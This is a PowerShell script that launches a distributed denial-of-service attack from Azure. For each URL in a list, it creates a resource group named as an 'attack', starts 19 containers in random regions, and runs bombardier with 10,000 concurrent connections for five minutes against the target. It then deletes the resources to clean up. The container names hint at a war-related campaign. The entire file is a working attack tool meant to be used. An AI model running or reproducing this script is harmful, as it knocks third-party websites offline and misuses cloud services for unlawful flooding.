param(
    [string] $urlsPath = "./urls.txt",
    [int] $agentCount = 100,
    [string] $executionTime = "60s",
    [int] $finishTimeout = 100
)

$urls = [System.IO.File]::ReadLines($urlsPath)

$id = 1

ForEach ($url in $urls)
{
    $resourceGroup = "rg-rw-attack-$(Get-Date -Format "MM-dd")-" + $id
    $id++

    az group create --location westus --name $resourceGroup
    
    for ($i = 1; $i -lt 20; $i++)
    {
        $location = .\GetRandomLocation

        $name = "ruswar" + $i
        echo "ResouceGroup: ${resourceGroup} Container: ${name} location: ${location} url: ${url}";

        az container create --resource-group $resourceGroup --name $name --image alpine/bombardier:latest --restart-policy OnFailure --command-line "/gopath/bin/bombardier -c 10000 -d 300s --http1 -l ${url}" --location $location
    }
    
    echo "Waiting 360 sec for all containers to finish. Url: ${url}";

    Start-Sleep -Seconds 360

    echo "Deleting resource group ${resourceGroup}";
    az group delete --resource-group $resourceGroup --yes
}

echo "FINISHED";
[console]::beep(500,1000)
    